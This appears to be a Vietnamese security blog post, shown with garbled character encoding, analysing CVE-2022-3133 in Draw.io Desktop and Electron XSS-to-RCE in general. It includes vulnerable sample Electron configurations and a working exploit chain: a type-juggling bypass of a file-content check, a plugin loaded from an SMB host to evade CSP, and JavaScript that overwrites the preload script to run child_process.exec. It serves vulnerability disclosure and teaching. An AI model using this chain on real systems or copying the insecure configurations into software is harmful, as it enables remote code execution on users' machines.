cÅ©ng lÃ  dá»‹p mÃ¬nh tÃ¬m hiá»ƒu vá» bug XSS trÃªn cÃ¡c á»©ng dá»¥ng desktop app nÃ y.\n#Má»Ÿ Ä‘áº§u Draw.io (diagrams.net) lÃ  má»™t pháº§n má»m váº½ biá»ƒu Ä‘á»“ Ä‘a ná»n táº£ng miá»…n phÃ­ vÃ  mÃ£ nguá»“n má»Ÿ Ä‘Æ°á»£c phÃ¡t triá»ƒn báº±ng HTML5 vÃ  JavaScript. Giao diá»‡n cá»§a nÃ³ cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº¡o cÃ¡c sÆ¡ Ä‘á»“ nhÆ° lÆ°u Ä‘á»“, khung dÃ¢y, sÆ¡ Ä‘á»“ UML, sÆ¡ Ä‘á»“ tá»• chá»©c vÃ  sÆ¡ Ä‘á»“ máº¡ng (Theo Wikipedia). CÃ²n Draw.io Desktop lÃ  á»©ng dá»¥ng dÃ nh cho desktop dá»±a trÃªn Electron vÃ  core lÃ  draw.io.\nElectron lÃ  khung pháº§n má»m mÃ£ nguá»“n má»Ÿ vÃ  Ä‘Æ°á»£c xÃ¢y dá»±ng dá»±a trÃªn Chromium nhÆ°ng nÃ³ khÃ´ng pháº£i lÃ  má»™t browser nhÆ° chÃºng ta biáº¿t. Má»™t cÃ¡ch hiá»ƒu Ä‘Æ¡n giáº£n lÃ  xem Electron nhÆ° lÃ  má»™t á»©ng dá»¥ng bao gá»“m cáº£ front-end vÃ  back-end, trong Ä‘Ã³ front-end lÃ  Chromium cÃ³ nhiá»‡m vá»¥ render web content vÃ  back-end lÃ  pháº§n xá»­ lÃ½ dá»±a trÃªn NodeJS.\nElectron thÃ´ng thÆ°á»ng cÃ³ 2 loáº¡i process:\nMain process: hoáº¡t Ä‘á»™ng nhÆ° má»™t application entry point, hoÃ n Ä‘Æ°á»£c truy cáº­p vÃ  xá»­ lÃ½ bá»Ÿi NodeJS. Renderer process: cÅ©ng nhÆ° tÃªn gá»i cá»§a nÃ³, process nÃ y chá»‹u trÃ¡ch nhiá»‡m cho viá»‡c render ná»™i dung cá»§a trang web (nhÆ° HTML, CSS, Javascript) mÃ  ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ tháº¥y vÃ  tÆ°Æ¡ng tÃ¡c Ä‘Æ°á»£c. ThÃ´ng thÆ°á»ng cÃ¡c renderer process Ä‘Æ°á»£c cáº¥u hÃ¬nh bÃªn trong main process náº±m á»Ÿ cÃ¡c file javascript xá»­ lÃ½ chÃ­nh, trong cÃ¡c options nÃ y sáº½ cÃ³ cÃ¡c option dÃ¹ng Ä‘á»ƒ phÃ²ng chá»‘ng viá»‡c ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ gá»i trá»±c tiáº¿p cÃ¡c NodeJS APIs náº¿u Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘Ãºng (Project máº«u cÃ³ thá»ƒ download táº¡i Ä‘Ã¢y).\nVÃ¬ renderer process chá»‹u trÃ¡ch nhiá»‡m parse code HTML nÃªn khÃ´ng thá»ƒ trÃ¡nh khá»i viá»‡c bá»‹ dÃ­nh lá»— há»•ng XSS, nÃªn tiáº¿p theo cÃ¹ng tÃ¬m hiá»ƒu lÃ  XSS trÃªn desktop app thÃ¬ nhÆ° tháº¿ nÃ o!!!\n#XSS trÃªn Electron Desktop App NhÆ° Ä‘Ã£ biáº¿t thÃ¬ Cross-site Scripting lÃ  lá»— há»•ng cho phÃ©p káº» táº¥n cÃ´ng cÃ³ thá»ƒ thá»±c thi tÃ¹y Ã½ mÃ£ javascript trÃªn browser cá»§a ngÆ°á»i dÃ¹ng nhÆ°ng Ä‘á»‘i vá»›i Desktop App cháº¡y trÃªn Electron thÃ¬ cÃ³ thá»ƒ dáº«n Ä‘áº¿n gá»i cÃ¡c NodeJS APIs vÃ  cÃ³ thá»ƒ thá»±c thi mÃ£ tá»« xa (RCE)\nMá»¥c Ä‘Ã­ch chÃ­nh cá»§a main process lÃ  táº¡o vÃ  quáº£n lÃ½ cÃ¡c application windows vá»›i BrowserWindow module. Má»™t vÃ­ dá»¥ má»™t á»©ng dá»¥ng nhÆ° sau:\n// main.js const { app, BrowserWindow, ipcMain } = require(\u0026#39;electron\u0026#39;) const path = require(\u0026#39;path\u0026#39;) function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;), nodeIntegration: true, contextIsolation: false, sandbox: false } }) // ... Giáº£i thÃ­ch má»™t sá»‘ options quan trá»ng:\npreload: lÃ  má»™t script sáº½ thá»±c thi trong má»™t renderer process trÆ°á»›c khi thá»±c hiá»‡n load web content, máº·c dÃ¹ script nÃ y Ä‘Æ°á»£c cháº¡y trong má»™t renderer context nhÆ°ng cÃ³ full quyá»n truy cáº­p vÃ o cÃ¡c NodeJS APIs. nodeIntegration: option nÃ y Ä‘Æ°á»£c báº­t cÃ³ nghÄ©a lÃ  renderer process cÃ³ thá»ƒ truy cáº­p trá»±c tiáº¿p vÃ  gá»i cÃ¡c NodeJS APIs, náº¿u XSS xáº£y ra thÃ¬ cÃ³ thá»ƒ cháº¡y Ä‘Æ°á»£c mÃ£ NodeJS trá»±c tiáº¿p. contextIsolation: option nÃ y Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ tÃ¡ch (hay cÃ´ láº­p) giá»¯a preload scripts vÃ  NodeJS APIs context vá»›i webContents context. VÃ­ dá»¥, náº¿u nhÆ° trong preload script set window.a = 1 thÃ¬ khi truy cáº­p vÃ o window.a á»Ÿ phÃ­a webContents sáº½ lÃ  undefined. sandbox: náº¿u option nÃ y Ä‘Æ°á»£c báº­t thÃ¬ renderer chá»‰ cÃ³ thá»ƒ thá»±c hiá»‡n má»™t sá»‘ hÃ nh Ä‘á»™ng Ä‘Æ°á»£c IPC cáº¥p. #Case 1: XSS + nodeIntegration NhÆ° Ä‘Ã£ nÃ³i ban Ä‘áº§u, náº¿u option nodeIntegration Ä‘Æ°á»£c báº­t thÃ¬ renderer process cÃ³ thá»ƒ gá»i trá»±c tiáº¿p NodeJS APIs, hay nÃ³i cÃ¡ch khÃ¡c tá»« trÃªn giao diá»‡n devtool web ta cÃ³ thá»ƒ thá»±c thi trá»±c tiáº¿p code NodeJS dáº«n Ä‘áº¿n RCE.\nVuln code:\n// main.js const { app, BrowserWindow, ipcMain } = require(\u0026#39;electron\u0026#39;) const path = require(\u0026#39;path\u0026#39;) function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true, contextIsolation: false, sandbox: false } }) // ... #Case 2: Preload + contextIsolation Giáº£ sá»­ trong trÆ°á»ng há»£p nÃ y, á»Ÿ preload script cÃ³ Ä‘á»‹nh nghÄ©a má»™t function cho phÃ©p thá»±c thi command tÃ¹y Ã½, nhÆ°ng vÃ¬ lÃ½ do option contextIsolation Ä‘Æ°á»£c set lÃ  false nÃªn dáº«n Ä‘áº¿n main process vÃ  renderer process cÃ³ chung context hay nÃ³i cÃ¡ch khÃ¡c lÃ  cáº£ 2 phÃ­a sáº½ dÃ¹ng chung má»™t global window object, nghÄ©a lÃ  tá»« phÃ­a renderer process cÃ³ thá»ƒ gá»i trá»±c tiáº¿p Ä‘áº¿n function nÃ y á»Ÿ phÃ­a main process.\nVuln code:\n//main.js const { app, BrowserWindow, ipcMain } = require(\u0026#39;electron\u0026#39;) const path = require(\u0026#39;path\u0026#39;) function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;), contextIsolation: false, sandbox: false } }) // ... // preload.js window.exec = (cmd) =\u0026gt; { require(\u0026#39;child_process\u0026#39;).exec(cmd) } CÃ¡ch Ä‘á»ƒ ngÄƒn cháº·n cuá»™c táº¥n cÃ´ng nÃ y chá»‰ Ä‘Æ¡n giáº£n lÃ  set contextIsolation = true vÃ  Ä‘á»“ng thá»i contextBridge module Ä‘Æ°á»£c sinh ra Ä‘á»ƒ expose cÃ¡c APIs tá»« preload script má»™t cÃ¡ch an toÃ n cho render process sá»­ dá»¥ng khi context giá»¯a main process vÃ  renderer process bá»‹ cÃ´ láº­p hoÃ n toÃ n. CÃ¡c APIs expose nÃ y Ä‘Æ°á»£c truy cáº­p thÃ´ng qua window object, má»¥c Ä‘Ã­ch cá»§a viá»‡c nÃ y lÃ  chá»‰ expose nhá»¯ng chá»©c nÄƒng cáº§n thiáº¿t chá»© khÃ´ng expose cáº£ má»™t window object ra cho renderer :v.\nVÃ­ dá»¥:\n// preload.js // preload with contextIsolation enabled const { contextBridge } = require(\u0026#39;electron\u0026#39;) contextBridge.exposeInMainWorld(\u0026#39;myAPI\u0026#39;, { doAThing: () =\u0026gt; {} }) // renderer.js // use the exposed API in the renderer window.myAPI.doAThing() #Case 3: RCE thÃ´ng qua IPC IPC (Inter-process communication) lÃ  má»™t pháº§n khÃ¡ quan trá»ng trÃªn á»©ng dá»¥ng Electron vÃ¬ nÃ³ chá»‹u trÃ¡ch nhiá»‡m cho viá»‡c liÃªn káº¿t (káº¿t ná»‘i) thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ giá»¯a main process vÃ  renderer process nhÆ° gá»i cÃ¡c native API tá»« UI.\nElectron cung cáº¥p 2 láº¡i IPC lÃ  IPC Main vÃ  IPC Renderer\nIPC Main cho phÃ©p main process giao tiáº¿p vá»›i renderer process Ä‘á»ƒ thá»±c hiá»‡n má»™t sá»‘ hoáº¡t Ä‘á»™ng há»‡ thá»‘ng nhÆ° quáº£n lÃ½ cá»­a sá»• á»©ng dá»¥ng, táº¡o quy trÃ¬nh má»›i hay giá» cÃ¡c module NodeJS. Äá»ƒ sá»­ dá»¥ng IPC Main cÃ³ thá»ƒ gá»i ipcMain module nÃ y Ä‘á»ƒ thá»±c hiá»‡n láº¯ng nghe cÅ©ng nhÆ° gá»­i message Ä‘áº¿n renderer process. VÃ­ dá»¥: // Main process const { app, BrowserWindow, ipcMain } = require(\u0026#39;electron\u0026#39;); app.on(\u0026#39;ready\u0026#39;, () =\u0026gt; { const mainWindow = new BrowserWindow(); mainWindow.loadURL(\u0026#39;https://example.com\u0026#39;); ipcMain.on(\u0026#39;message-from-renderer\u0026#39;, (event, arg) =\u0026gt; { console.log(arg); // Log message from renderer process event.sender.send(\u0026#39;message-to-renderer\u0026#39;, \u0026#39;Hello from main process!\u0026#39;); }); }); IPC Renderer cho phÃ©p renderer process giao tiáº¿p vá»›i main process, Ä‘á»ƒ sá»­ dá»¥ng IPC Renderer cÃ³ thá»ƒ sá»­ dá»¥ng ipcRenderer module Ä‘á»ƒ Ä‘Æ°á»£c cung cáº¥p má»™t sá»‘ giao thá»©c gá»­i vÃ  láº¯ng nghe thÃ´ng Ä‘iá»‡p Ä‘áº¿n tá»« main process. VÃ­ dá»¥: // Renderer process const { ipcRenderer } = require(\u0026#39;electron\u0026#39;); ipcRenderer.send(\u0026#39;message-from-renderer\u0026#39;, \u0026#39;Hello from renderer process!\u0026#39;); ipcRenderer.on(\u0026#39;message-to-renderer\u0026#39;, (event, arg) =\u0026gt; { console.log(arg); // Log message from main process }); Má»™t vÃ­ dá»¥ vá» trÆ°á»ng há»£p sá»­ dá»¥ng IPC má»™t cÃ¡ch khÃ´ng an toÃ n:\n// main.js const { app, BrowserWindow, ipcMain, shell } = require(\u0026#39;electron\u0026#39;) const path = require(\u0026#39;path\u0026#39;) function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;), contextIsolation: true, sandbox: false } }) ipcMain.on(\u0026#39;openURL\u0026#39;, (event, url) =\u0026gt; { shell.openExternal(url) }) // ... // preload.js const { contextBridge, ipcRenderer } = require(\u0026#39;electron\u0026#39;) contextBridge.exposeInMainWorld(\u0026#39;electronAPI\u0026#39;, { openURL: (url) =\u0026gt; ipcRenderer.send(\u0026#39;openURL\u0026#39;, url) }) má»™t sá»‘ Ä‘iá»ƒm cáº§n hiá»ƒu rÃµ á»Ÿ nhá»¯ng Ä‘oáº¡n code trÃªn nhÆ° sau:\ncontextIsolation = true IPC Main sáº½ láº¯ng nghe event â€œopenURLâ€, sau Ä‘Ã³ thá»±c thi shell.openExternal vá»›i tham sá»‘ url Ä‘Æ°á»£c truyá»n vÃ o =\u0026gt; ÄÃ¢y cÅ©ng lÃ  sink cá»§a lá»— há»•ng, hÃ m nÃ y cho phÃ©p má»Ÿ má»t URL hoáº·c tá»‡p tin bÃªn ngoÃ i Electron dáº«n Ä‘áº¿n RCE. á» preload script expose electronAPI ra bÃªn ngoÃ i cho renderer cÃ³ thá»ƒ gá»i hÃ m openURL, sau Ä‘Ã³ ipcRenderer sáº½ gá»­i message Ä‘áº¿n ipcMain á»Ÿ openURL channel mÃ  IPC Maind Ä‘ang láº¯ng nghe. VÃ¬ tháº¿, á»Ÿ Ä‘Ã¢y ta sáº½ dÃ¹ng file protocol Ä‘á»ƒ gá»i Ä‘áº¿n tá»‡p tin hay chÆ°Æ¡ng trÃ¬nh bÃªn ngoÃ i (cÃ³ thá»ƒ lÃ  virus hoáº·c backdoor) Ä‘á»ƒ chiáº¿m quyá»n Ä‘iá»u khiá»ƒn há»‡ thá»‘ng. ÄÃ³ lÃ  cÆ¡ báº£n vá» má»™t sá»‘ lá»— há»•ng trÃªn á»©ng dá»¥ng Ä‘Æ°á»£c táº¡o nÃªn tá»« Electron, tiáº¿p theo sáº½ vÃ o váº¥n Ä‘á» chÃ­nh, sáº½ nÃ³i vá» bug trÃªn app Draw.io\n#CVE-2022-3133 Lá»— há»•ng nÃ y Ä‘Æ°á»£c report vÃ  public trÃªn huntr.dev bá»Ÿi researcher mizu, cá»¥ thá»ƒ lÃ  láº¡m dá»¥ng lá»• há»•ng XSS Ä‘á»ƒ thá»±c hiá»‡n chá»©c nÄƒng writeFile á»Ÿ IPC Main Ä‘á»ƒ override tá»‡p preload script Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi mÃ£ tá»« xa (RCE).\n#Abuse of ipcMain to override preload script á» file electron.js, ipcMain Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a láº¯ng nghe sá»± kiá»‡n rendererReq vÃ  bao gá»“m nhiá»u action\n// ... ipcMain.on(\u0026#34;rendererReq\u0026#34;, async (event, args) =\u0026gt; { try { let ret = null; switch(args.action) { // ... case \u0026#39;writeFile\u0026#39;: ret = await writeFile(args.path, args.data, args.enc); break; // ... trong Ä‘Ã³ Ä‘Ã¡ng chÃº Ã½ lÃ  writeFile action nháº­n vÃ o tham sá»‘ lÃ  path, data, enc. Äá»“ng thá»i, á»Ÿ electron-preloads.js expose API electron cho phÃ©p gá»i rendererReq channel tá»« renderer process nhÆ° sau\n// ... contextBridge.exposeInMainWorld( \u0026#39;electron\u0026#39;, { request: (msg, callback, error) =\u0026gt; { msg.reqId = reqId++; reqInfo[msg.reqId] = {callback: callback, error: error}; //TODO Maybe a special function for this better than this hack? //File watch special case where the callback is called multiple times if (msg.action == \u0026#39;watchFile\u0026#39;) { fileChangedListeners[msg.path] = msg.listener; delete msg.listener; } ipcRenderer.send(\u0026#39;rendererReq\u0026#39;, msg); }, // ... =\u0026gt; Ã tÆ°á»Ÿng á»Ÿ Ä‘Ã¢y sáº½ lÃ  láº¡m dá»¥ng chá»©c nÄƒng writeFile nÃ y Ä‘á»ƒ ghi Ä‘Ã¨ thay Ä‘á»•i ná»™i dung cá»§a electron-preload.js Ä‘á»ƒ trá»±c tiáº¿p thá»±c thi mÃ£ NodeJS.\n#Type juggling bypass checkFileContent HÃ m writeFile Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° sau:\n// ... async function writeFile(path, data, enc) { if (!checkFileContent(data, enc)) { throw new Error(\u0026#39;Invalid file data\u0026#39;); } else { return await fsProm.writeFile(path, data, enc); } }; // ... trong Ä‘Ã³, hÃ m checkFileContent kiá»ƒm tra content type tá»« dá»¯ liá»‡u Ä‘Æ°a vÃ o, má»¥c tiÃªu cá»§a chÃºng ta lÃ  pháº£i chÃ¨n ná»™i dung javascript há»£p lá»‡ vÃ o electron-preload.js.\n// ... function checkFileContent(body, enc) { if (body != null) { let head, headBinay; if (typeof body === \u0026#39;string\u0026#39;) { if (enc == \u0026#39;base64\u0026#39;) { headBinay = Buffer.from(body.substring(0, 22), \u0026#39;base64\u0026#39;); head = headBinay.toString(); } else { head = body.substring(0, 16); headBinay = Buffer.from(head); } } // ... let c1 = head[0], c2 = head[1], c3 = head[2], c4 = head[3], ... if (c1 == \u0026#39;\u0026lt;\u0026#39;) { // text/html if (c2 == \u0026#39;!\u0026#39; // ... // application/xml if (c2 == \u0026#39;?\u0026#39; \u0026amp;\u0026amp; c3 == \u0026#39;x\u0026#39; \u0026amp;\u0026amp; c4 == \u0026#39;m\u0026#39; \u0026amp;\u0026amp; c5 == \u0026#39;l\u0026#39; \u0026amp;\u0026amp; c6 == \u0026#39; \u0026#39;) { // ... á» Ä‘Ã¢y ta cÃ³ thá»ƒ tháº¥y ráº±ng dá»¯ liá»‡u mong muá»‘n tá»« Ä‘áº§u vÃ o lÃ  cÃ¡c file Ä‘á»‹nh dáº¡ng nhÆ° text/html, application/xml, application/pdf, image/*. NghÄ©a lÃ  nhá»¯ng bytes Ä‘áº§u tiÃªn cá»§a cÃ¡c Ä‘á»‹nh dáº¡ng nÃ y thÆ°á»ng báº¯t Ä‘áº§u báº±ng nhá»¯ng kÃ½ tá»± Ä‘áº·c biá»‡t, vÃ¬ lÃ½ do nÃ y nÃªn sáº½ gÃ¢y ra lá»—i syntax khi viáº¿t vÃ o má»™t file javascript.\nMá»™t Ä‘iá»u ná»¯a lÃ  chá»‰ láº¥y 16 bytes header tá»« input Ä‘á»ƒ validate náº¿u khÃ´ng pháº£i lÃ  dáº¡ng base64, cÃ²n náº¿u lÃ  base64 thÃ¬ láº¥y 22 kÃ½ tá»± Ä‘áº§u Ä‘á»ƒ Ä‘em Ä‘i decode vÃ  tiáº¿p theo lÃ  Ä‘em Ä‘i check.\nMá»¥c tiÃªu cá»§a chÃºng ta Ä‘Æ¡n giáº£n chá»‰ lÃ  lÃ m cho hÃ m nÃ y tráº£ vá» true lÃ  Ä‘Æ°á»£c, sau Ä‘Ã³ dá»¯ liá»‡u sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o fsProm.writeFile Ä‘á»ƒ ghi xuá»‘ng tá»‡p. Váº­y bug á»Ÿ Ä‘Ã¢y lÃ  gÃ¬???\n// ... function checkFileContent(body, enc) { if (body != null) { let head, headBinay; if (typeof body === \u0026#39;string\u0026#39;) { if (enc == \u0026#39;base64\u0026#39;) // ... // ... Lá»— há»•ng type juggling xuáº¥t hiá»‡n á»Ÿ enc == 'base64', bá»Ÿi vÃ¬:\nâ€œbase64â€ == â€œbase64â€\ntrue\n[â€œbase64â€] == â€œbase64â€\ntrue\nVáº­y náº¿u ta truyá»n vÃ o tham sá»‘ enc = [\u0026quot;base64\u0026quot;] thÃ¬ sáº½ cÃ³ Ã½ nghÄ©a gÃ¬??? Má»i thá»© Ä‘á»u cÃ³ lÃ½ do cá»§a nÃ³ =))) VÃ¬ hÃ m fs.writeFile nháº­n vÃ o tham sá»‘ option lÃ  string hoáº·c object, náº¿u option encoding = \u0026quot;base64\u0026quot; thÃ¬ input sáº½ decode base64 rá»“i má»›i Ä‘Æ°á»£c ghi xuá»‘ng file, cÃ²n náº¿u encoding = [\u0026quot;base64\u0026quot;] thÃ¬ dá»¯ liá»‡u sáº½ khÃ´ng cáº§n decode vÃ¬ default = utf-8 mÃ  ghi tháº³ng xuá»‘ng file.\nconst fsProm = require(\u0026#39;fs/promises\u0026#39;); fsProm.writeFile(\u0026#34;/tmp/output\u0026#34;, \u0026#34;PGh0bWwxMzMzMzMzMzMzMzM=\u0026#34;, \u0026#34;base64\u0026#34;) // Output: \u0026lt;html133333333333 const fsProm = require(\u0026#39;fs/promises\u0026#39;); fsProm.writeFile(\u0026#34;/tmp/output\u0026#34;, \u0026#34;PGh0bWwxMzMzMzMzMzMzMzM=\u0026#34;, [\u0026#34;base64\u0026#34;]) // Output: PGh0bWwxMzMzMzMzMzMzMzM= NhÆ° váº­y lÃ  Ä‘Ã£ rÃµ, náº¿u ta truyá»n vÃ o data lÃ  chuá»—i báº¯t Ä‘áº§u báº±ng \u0026lt;html dáº¡ng base64 á»Ÿ 22 kÃ½ tá»± Ä‘áº§u vá»›i enc = [\u0026quot;base64\u0026quot;] thÃ¬ khi validate sáº½ bá»‹ base64 decode nhÆ°ng Ä‘áº¿n hÃ m fsProm.write sáº½ khi trá»±c tiáº¿p chuá»—i base64 xuá»‘ng file vÃ  cÃ³ thá»ƒ control Ä‘Æ°á»£c code á»Ÿ phÃ­a sau.\nPGh0bWxhYWFhYWFhYWFhYWE=1337;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;calc\u0026#39;);// #Find the webroot May máº¯n lÃ  rendererReq channel á»Ÿ ipcMain cÃ³ getCurDir action, action nÃ y sáº½ thá»±c thi hÃ m getCurDir vÃ  tráº£ vá» Ä‘Æ°á»ng dáº«n hiá»‡n táº¡i =\u0026gt; ÄÆ°á»ng dáº«n nÃ y cÅ©ng lÃ  nÆ¡i chá»©a electron-preload.js\n// ... ipcMain.on(\u0026#34;rendererReq\u0026#34;, async (event, args) =\u0026gt; { try { let ret = null; switch(args.action) { // ... case \u0026#39;getCurDir\u0026#39;: ret = await getCurDir(); break; } // ... #Look for XSS vulnerabilities Theo nhÆ° document thÃ¬ cÃ¡c plugin cÃ³ thá»ƒ Ä‘Æ°á»£c load thÃ´ng qua viá»‡c cáº¥u hÃ¬nh má»™t danh sÃ¡ch cÃ¡c tÃªn plugin trÃªn UI.\nCháº³ng háº¡n nhÆ° ta cáº¥u hÃ¬nh nhÆ° tháº¿ nÃ y: thÃ¬ plugin voice sáº½ Ä‘Æ°á»£c load VÃ¬ lÃ½ do bá»‹ háº¡n cháº¿ bá»Ÿi CSP nÃªn ta khÃ´ng thá»ƒ load báº¥t ká»³ extension nÃ o khÃ¡c tÃ¹y Ã½\ndefault-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; media-src *; font-src *; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://fonts.googleapis.com nÃªn cÃ¡c script chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c load tá»« self nhÆ°ng ta cÃ³ thá»ƒ hoÃ n toÃ n bypass Ä‘Æ°á»£c CSP nÃ y thÃ´ng qua load má»™t script tá»« SMB server, váº¥n Ä‘á» nÃ y Ä‘Ã£ Ä‘Æ°á»£c nÃ³i rÃµ tá»« báº£n report https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/\n{ \u0026#34;plugins\u0026#34;: [ \u0026#34;\\\\\\\\10.69.157.158\\\\js-server\\\\exploit.js\u0026#34; ] } #Exploit Chain má»i thá»© láº¡i thÃ¬ Ã½ tÆ°á»Ÿng khai thÃ¡c lÃ  láº¡m dá»¥ng lá»— há»•ng XSS thÃ´ng qua tamper configure load malicous script tá»« SMB server Ä‘á»ƒ gá»i cÃ¡c APIs tá»« renderer process, thá»±c hiá»‡n láº§n lÆ°á»£t cÃ¡c action getCurDir, writeFile Ä‘á»ƒ ghi Ä‘Ã¨ electron-preload.script. Sau Ä‘Ã³, thá»±c hiá»‡n electron.sendMessage('newfile') Ä‘á»ƒ táº¡o ra má»™t renderer process má»›i, Ä‘á»“ng thá»i Ä‘á»ƒ electron-preload.js má»›i Ä‘Æ°á»£c load vÃ  RCE.\nelectron.request({ action: \u0026#34;getCurDir\u0026#34; }, (d) =\u0026gt; { electron.request({ action: \u0026#34;writeFile\u0026#34;, path: `${d}/electron-preload.js`, data: \u0026#34;PGh0bWxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY=1;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;calc\u0026#39;);//\u0026#34;, enc: [\u0026#34;base64\u0026#34;] }, (res) =\u0026gt; { electron.sendMessage(\u0026#39;newfile\u0026#39;, {width: 100, height: 100 }); }) }) #References https://huntr.dev/bounties/2d93052f-efc6-4647-9a6d-8b08dc251223/ https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/ https://deepsec.net/docs/Slides/2021/Hacking_Modern_Desktop_apps_with_XSS_and_RCE_Abraham_Aranguren.pdf https://www.electronjs.org/docs/latest/tutorial/ipc ","permalink":"https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/","summary":"CVE-2022-3133 analysis","title":"[CVE-2022-3133] Draw.io â€“ XSS leads to RCE"}]